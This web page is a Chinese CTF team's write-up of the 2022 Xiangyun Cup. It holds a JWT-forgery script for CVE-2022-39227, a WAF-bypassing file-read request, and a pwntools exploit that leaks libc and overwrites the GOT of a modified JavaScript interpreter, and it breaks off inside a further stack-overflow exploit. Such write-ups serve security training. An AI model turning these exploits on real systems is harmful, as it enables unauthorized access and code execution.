<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2022 祥云杯 SU Writeup - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="以下是我们 SU 本次2022 祥云杯 的 writeup ，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)"><meta property="og:type" content="blog"><meta property="og:title" content="2022 祥云杯 SU Writeup"><meta property="og:url" content="https://team-su.github.io/posts/28616.html"><meta property="og:site_name" content="su-team"><meta property="og:description" content="以下是我们 SU 本次2022 祥云杯 的 writeup ，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/images/2022-xyb-SU-Writeup/1.png"><meta property="og:image" content="https://team-su.github.io/images/2022-xyb-SU-Writeup/2.png"><meta property="og:image" content="https://team-su.github.io/images/2022-xyb-SU-Writeup/3.png"><meta property="og:image" content="https://team-su.github.io/images/2022-xyb-SU-Writeup/4.png"><meta property="og:image" content="https://team-su.github.io/images/2022-xyb-SU-Writeup/5.png"><meta property="og:image" content="https://team-su.github.io/images/2022-xyb-SU-Writeup/10.png"><meta property="og:image" content="https://team-su.github.io/images/2022-xyb-SU-Writeup/11.png"><meta property="og:image" content="https://team-su.github.io/images/2022-xyb-SU-Writeup/12.png"><meta property="og:image" content="https://team-su.github.io/images/2022-xyb-SU-Writeup/13.png"><meta property="og:image" content="https://team-su.github.io/images/2022-xyb-SU-Writeup/6.png"><meta property="og:image" content="https://team-su.github.io/images/2022-xyb-SU-Writeup/7.png"><meta property="og:image" content="https://team-su.github.io/images/2022-xyb-SU-Writeup/8.png"><meta property="og:image" content="https://team-su.github.io/images/2022-xyb-SU-Writeup/9.png"><meta property="article:published_time" content="2022-10-30T23:43:42.000Z"><meta property="article:modified_time" content="2025-07-13T11:41:21.796Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="祥云杯"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/images/2022-xyb-SU-Writeup/1.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/posts/28616.html"},"headline":"2022 祥云杯 SU Writeup","image":["https://team-su.github.io/images/2022-xyb-SU-Writeup/1.png","https://team-su.github.io/images/2022-xyb-SU-Writeup/2.png","https://team-su.github.io/images/2022-xyb-SU-Writeup/3.png","https://team-su.github.io/images/2022-xyb-SU-Writeup/4.png","https://team-su.github.io/images/2022-xyb-SU-Writeup/5.png","https://team-su.github.io/images/2022-xyb-SU-Writeup/10.png","https://team-su.github.io/images/2022-xyb-SU-Writeup/11.png","https://team-su.github.io/images/2022-xyb-SU-Writeup/12.png","https://team-su.github.io/images/2022-xyb-SU-Writeup/13.png","https://team-su.github.io/images/2022-xyb-SU-Writeup/6.png","https://team-su.github.io/images/2022-xyb-SU-Writeup/7.png","https://team-su.github.io/images/2022-xyb-SU-Writeup/8.png","https://team-su.github.io/images/2022-xyb-SU-Writeup/9.png"],"datePublished":"2022-10-30T23:43:42.000Z","dateModified":"2025-07-13T11:41:21.796Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"以下是我们 SU 本次2022 祥云杯 的 writeup ，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)"}</script><link rel="canonical" href="https://team-su.github.io/posts/28616.html"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a><a class="navbar-item" href="https://forms.office.com/r/YxbUJJ3i78">Join</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="RSS Feed" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-10-30T23:43:42.000Z" title="2022/10/31 07:43:42">2022-10-31</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-07-13T11:41:21.796Z" title="2025/7/13 19:41:21">2025-07-13</time></span><span class="level-item">40 minutes read (About 6003 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">2022 祥云杯 SU Writeup</h1><div class="content"><p>以下是我们 SU 本次2022 祥云杯 的 writeup ，感谢队里师傅们的辛苦付出！<br>同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#115;&#x75;&#x65;&#114;&#115;&#95;&#120;&#x63;&#116;&#x66;&#64;&#49;&#x32;&#54;&#x2e;&#x63;&#111;&#x6d;">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)</p>
<span id="more"></span>
<hr>
<p>以下是我们 SU 本次2022 祥云杯 的 writeup ，感谢队里师傅们的辛苦付出！<br>同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#x73;&#117;&#101;&#x72;&#x73;&#x5f;&#120;&#99;&#116;&#x66;&#64;&#x31;&#x32;&#x36;&#46;&#x63;&#111;&#x6d;">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)</p>
<div class="toc">

<!-- toc -->

<ul>
<li><a href="#web">Web</a><ul>
<li><a href="#funweb">FunWEB</a></li>
<li><a href="#ezjava">ezjava</a></li>
<li><a href="#rustwaf">Rustwaf</a></li>
</ul>
</li>
<li><a href="#pwn">pwn</a><ul>
<li><a href="#ojs">ojs</a></li>
<li><a href="#protocol">protocol</a></li>
<li><a href="#queue">queue</a></li>
<li><a href="#unexploitable">unexploitable</a></li>
<li><a href="#sandboxheap">sandboxheap</a></li>
<li><a href="#bitheap">bitheap</a></li>
<li><a href="#leak">leak</a></li>
</ul>
</li>
<li><a href="#misc">Misc</a><ul>
<li><a href="#strange-forensics">strange_forensics</a></li>
</ul>
</li>
<li><a href="#rev">Rev</a><ul>
<li><a href="#roket">roket</a></li>
</ul>
</li>
<li><a href="#crypto">crypto</a><ul>
<li><a href="#little-little-fermat">little little fermat</a></li>
<li><a href="#tracing">tracing</a></li>
<li><a href="#fill">fill</a></li>
<li><a href="#babydlp">babyDLP</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div>


<h1><span id="web">Web</span><a href="#web" class="header-anchor"></a></h1><h2><span id="funweb">FunWEB</span><a href="#funweb" class="header-anchor"></a></h2><p>注册一个账号，然后登录，发现是jwt，参考cve-2022-39227，拿官方exp构造越权<br><a href="https://github.com/davedoesdev/python-jwt/blob/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9/test/vulnerability_vows.py">https://github.com/davedoesdev/python-jwt/blob/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9/test/vulnerability_vows.py</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads, dumps</span><br><span class="line"><span class="keyword">import</span> python_jwt <span class="keyword">as</span> jwt</span><br><span class="line"><span class="keyword">from</span> jwcrypto.common <span class="keyword">import</span> base64url_decode, base64url_encode</span><br><span class="line"></span><br><span class="line">topic = <span class="string">&quot;ddd&quot;</span></span><br><span class="line">[header, payload, signature] = topic.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">parsed_payload[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="number">1</span></span><br><span class="line">parsed_payload[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">parsed_payload[<span class="string">&#x27;exp&#x27;</span>] = <span class="number">2000000000</span></span><br><span class="line">fake_payload = base64url_encode((dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake_payload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="../images/2022-xyb-SU-Writeup/1.png" alt="img"><br>生成后就可以开始使用graphql注入，一步步注入获取密码为13Rj2x7VgjCLHIOZSGX0<br><img src="../images/2022-xyb-SU-Writeup/2.png" alt="img"><br>登录后查看flag</p>
<h2><span id="ezjava">ezjava</span><a href="#ezjava" class="header-anchor"></a></h2><p><img src="../images/2022-xyb-SU-Writeup/3.png" alt="img"><br>cc4可以直接打，但是不出网，所以得打一个tomcat通用回显<br><img src="../images/2022-xyb-SU-Writeup/4.png" alt="img"></p>
<h2><span id="rustwaf">Rustwaf</span><a href="#rustwaf" class="header-anchor"></a></h2><p>先读src，然后使用&#x2F;readfile 传入&#x2F;flag可以进一步看到源码<br><img src="../images/2022-xyb-SU-Writeup/5.png" alt="img"><br>参考<a href="https://blog.maple3142.net/2022/08/07/corctf-2022-writeups/#rustshop">https://blog.maple3142.net/2022/08/07/corctf-2022-writeups/#rustshop</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /readfile HTTP/<span class="number">1.1</span></span><br><span class="line">Host: eci-2zef45s04koksnpurlze.cloudeci1.ichunqiu.com:<span class="number">3000</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">106.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">106.0</span></span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line">Cache: no-cache</span><br><span class="line">Content-Length: <span class="number">36</span></span><br><span class="line">Origin: moz-extension://74b5b769-a8c6-3b45-af82-1453eac308dd</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">[<span class="string">&quot;file:&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;/%66%6c%61%67&quot;</span>,<span class="string">&quot;&quot;</span>]</span><br></pre></td></tr></table></figure>

<h1><span id="pwn">pwn</span><a href="#pwn" class="header-anchor"></a></h1><h2><span id="ojs">ojs</span><a href="#ojs" class="header-anchor"></a></h2><p>查找关键词可知，这题魔改自项目：<a href="https://github.com/ndreynolds/flathead">https://github.com/ndreynolds/flathead</a><br>比对源码可知，新增了方法<code>charTo</code><br>逆一下，<code>str.charTo(offset, val)</code>代表将字符串<code>str</code>偏移<code>offset</code>（可正可负）处改为<code>val</code>。</p>
<p>可越界写的条件是字符串<code>str</code>的长度为<code>3</code>，且当<code>val = 17</code>的时候，会返回存放<code>str</code>自身的堆块地址（结合动态调试）。</p>
<p><img src="../images/2022-xyb-SU-Writeup/10.png" alt="image"></p>
<p>由于本题没开<code>PIE</code>保护，且<code>got</code>表可写：</p>
<p><img src="../images/2022-xyb-SU-Writeup/11.png" alt="image"></p>
<p>所以其实任意写的思路很显然：先泄露出<code>str</code>自身堆块地址，然后就能用其与某<code>got</code>表地址的差值通过<code>charTo</code>任意写<code>got</code>表了。</p>
<p>泄露<code>libc</code>的思路也不难想到，可以将初始长度为<code>3</code>的<code>str</code>后面的<code>\x00</code>不断覆盖掉，这样就能泄露后面内存中的<code>libc</code>地址了，这里其实也可以泄露出堆块地址。</p>
<p>不过，由于比赛的时候远程环境十分诡异，导致当时配了几个小时环境都没弄出来远程的环境（打通以后才知道原因应该是由于共享库被放在了题目的同一目录下QAQ），后来就干脆采用了无脑爆破的做法。<code>str</code>后面内存区域中<code>libc</code>的位置需要爆破一下，得到是<code>60*8</code>的偏移处，然后得到了<code>libc</code>地址以后，其相对于基地址的偏移也需要爆破一下（这里其实有个技巧，就比如我这里劫持的是<code>printf</code>的<code>got</code>表，那么可能出问题也就是倒数第二、三个字节，先只改倒数第二个字节，其余保持原先的值不变，如果最后能正常输出，则表示倒数第四位的偏移爆破正确了，倒数第三个字节的爆破也同理这么操作）。</p>
<p>此外，这里应该也可以通过改某个<code>got</code>表为<code>puts@plt</code>，然后输入某个<code>got</code>的地址来泄露<code>libc</code>，或者先劫持<code>bss</code>段上的<code>stdin/stdout/stderr</code>指针为某个<code>got</code>表地址，然后比如再改<code>setvbuf</code>的<code>got</code>表为<code>puts@plt</code>，最后劫持执行流到<code>setvbuf</code>来泄露。不过这里貌似不太好泄露完再返回了，但是通过这里泄露的值和上述<code>60*8</code>的位置泄露的<code>libc</code>比对一下就不需要上面的爆破操作了。</p>
<p>最后，选用如下<code>one_gadget</code>即可：<br><img src="../images/2022-xyb-SU-Writeup/12.png" alt="image"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;39.106.13.71&quot;</span>, <span class="number">38641</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ojs&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&#x27;a = &quot;win&quot;;&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&#x27;x = a.charTo(0, 17);&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&#x27;console.log(&quot;xxx&quot; + x.toString() + &quot;xxx&quot;);&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.recvuntil(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;xxx&quot;</span>).strip(<span class="string">b&quot;xxx&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;heap_addr:\t&quot;</span> + <span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&#x27;for(var i = 3; i &lt; 60*8; i++) a.charTo(i, 97);&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&#x27;console.log(a);&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;libc_addr:\t&quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">libc_base = libc_addr - <span class="number">0xd22ce8</span></span><br><span class="line">success(<span class="string">&quot;libc_base:\t&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">dis = elf.got[<span class="string">&#x27;printf&#x27;</span>] - heap_addr</span><br><span class="line">og = p64(libc_base + <span class="number">0xe54f7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>) :</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">f&#x27;a.charTo(<span class="subst">&#123;dis+i&#125;</span>, <span class="subst">&#123;og[i]&#125;</span>);&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&#x27;b = [];&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&#x27;b.push(&quot;winmt&quot;);&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="../images/2022-xyb-SU-Writeup/13.png" alt="image"></p>
<h2><span id="protocol">protocol</span><a href="#protocol" class="header-anchor"></a></h2><p>protobuf协议，存在一个strcpy造成栈溢出，通过strcpy末尾补0的性质多次刷0组合，避开00截断的问题。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span></span><br><span class="line"><span class="comment"># source: ctf.proto</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">_b=sys.version_info[<span class="number">0</span>]&lt;<span class="number">3</span> <span class="keyword">and</span> (<span class="keyword">lambda</span> x:x) <span class="keyword">or</span> (<span class="keyword">lambda</span> x:x.encode(<span class="string">&#x27;latin1&#x27;</span>))</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> descriptor <span class="keyword">as</span> _descriptor</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> message <span class="keyword">as</span> _message</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> reflection <span class="keyword">as</span> _reflection</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> symbol_database <span class="keyword">as</span> _symbol_database</span><br><span class="line"><span class="comment"># @@protoc_insertion_point(imports)</span></span><br><span class="line"></span><br><span class="line">_sym_db = _symbol_database.Default()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DESCRIPTOR = _descriptor.FileDescriptor(</span><br><span class="line">  name=<span class="string">&#x27;ctf.proto&#x27;</span>,</span><br><span class="line">  package=<span class="string">&#x27;ctf&#x27;</span>,</span><br><span class="line">  syntax=<span class="string">&#x27;proto2&#x27;</span>,</span><br><span class="line">  serialized_options=<span class="literal">None</span>,</span><br><span class="line">  serialized_pb=_b(<span class="string">&#x27;\n\tctf.proto\x12\x03\x63tf\&quot;)\n\x03pwn\x12\x10\n\x08username\x18\x01 \x01(\x0c\x12\x10\n\x08password\x18\x02 \x01(\x0c&#x27;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_PWN = _descriptor.Descriptor(</span><br><span class="line">  name=<span class="string">&#x27;pwn&#x27;</span>,</span><br><span class="line">  full_name=<span class="string">&#x27;ctf.pwn&#x27;</span>,</span><br><span class="line">  filename=<span class="literal">None</span>,</span><br><span class="line">  file=DESCRIPTOR,</span><br><span class="line">  containing_type=<span class="literal">None</span>,</span><br><span class="line">  fields=[</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;username&#x27;</span>, full_name=<span class="string">&#x27;ctf.pwn.username&#x27;</span>, index=<span class="number">0</span>,</span><br><span class="line">      number=<span class="number">1</span>, <span class="built_in">type</span>=<span class="number">12</span>, cpp_type=<span class="number">9</span>, label=<span class="number">1</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=_b(<span class="string">&quot;&quot;</span>),</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;password&#x27;</span>, full_name=<span class="string">&#x27;ctf.pwn.password&#x27;</span>, index=<span class="number">1</span>,</span><br><span class="line">      number=<span class="number">2</span>, <span class="built_in">type</span>=<span class="number">12</span>, cpp_type=<span class="number">9</span>, label=<span class="number">1</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=_b(<span class="string">&quot;&quot;</span>),</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">  ],</span><br><span class="line">  extensions=[</span><br><span class="line">  ],</span><br><span class="line">  nested_types=[],</span><br><span class="line">  enum_types=[</span><br><span class="line">  ],</span><br><span class="line">  serialized_options=<span class="literal">None</span>,</span><br><span class="line">  is_extendable=<span class="literal">False</span>,</span><br><span class="line">  syntax=<span class="string">&#x27;proto2&#x27;</span>,</span><br><span class="line">  extension_ranges=[],</span><br><span class="line">  oneofs=[</span><br><span class="line">  ],</span><br><span class="line">  serialized_start=<span class="number">18</span>,</span><br><span class="line">  serialized_end=<span class="number">59</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">DESCRIPTOR.message_types_by_name[<span class="string">&#x27;pwn&#x27;</span>] = _PWN</span><br><span class="line">_sym_db.RegisterFileDescriptor(DESCRIPTOR)</span><br><span class="line"></span><br><span class="line">pwn = _reflection.GeneratedProtocolMessageType(<span class="string">&#x27;pwn&#x27;</span>, (_message.Message,), <span class="built_in">dict</span>(</span><br><span class="line">  DESCRIPTOR = _PWN,</span><br><span class="line">  __module__ = <span class="string">&#x27;ctf_pb2&#x27;</span></span><br><span class="line">  <span class="comment"># @@protoc_insertion_point(class_scope:ctf.pwn)</span></span><br><span class="line">  ))</span><br><span class="line">_sym_db.RegisterMessage(pwn)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># @@protoc_insertion_point(module_scope)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctf_pb2</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./protocol&quot;)</span></span><br><span class="line">io = remote(<span 